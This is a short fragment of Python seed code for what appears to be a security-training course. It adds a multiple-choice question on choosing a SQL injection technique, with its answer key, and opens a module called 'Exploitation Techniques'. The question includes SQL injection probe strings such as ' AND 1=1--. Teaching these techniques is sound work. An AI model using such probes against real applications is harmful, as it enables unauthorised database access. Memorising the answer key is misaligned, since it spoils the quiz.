    db.session.add(LessonStep(lesson_id=l4_7.id, order_index=1, kind="mcq", title="MULTIPLE CHOICE (Scenario)", prompt="You're testing a web application. You discover:\\n- Entering `'` in the search field returns a generic \"An error occurred\" page (no SQL details)\\n- Entering `' AND 1=1--` shows search results\\n- Entering `' AND 1=2--` shows \"No results found\"\\n- The `UNION SELECT` keyword is filtered/blocked\\nWhich injection technique should you use?", options=_opts(("A", "A) Error-based injection"), ("B", "B) UNION-based injection"), ("C", "C) Boolean-based blind injection"), ("D", "D) Time-based blind injection")), correct_answer="\"C\"", explanation="Error-based won't work (generic error page). UNION is blocked. But the page behaves differently for true (1=1) vs false (1=2) conditions. Boolean-based blind injection is the way to go.", hints=_j([])))

    # ── MODULE 05: Exploitation Techniques ──────────────────────────────────
    m5 = Module(order_index=5, title="Exploitation Techniques", description=DESCRIPTIONS.get(5, ""), icon=ICONS.get(5, "database"), difficulty="Advanced", estimated_minutes=30)
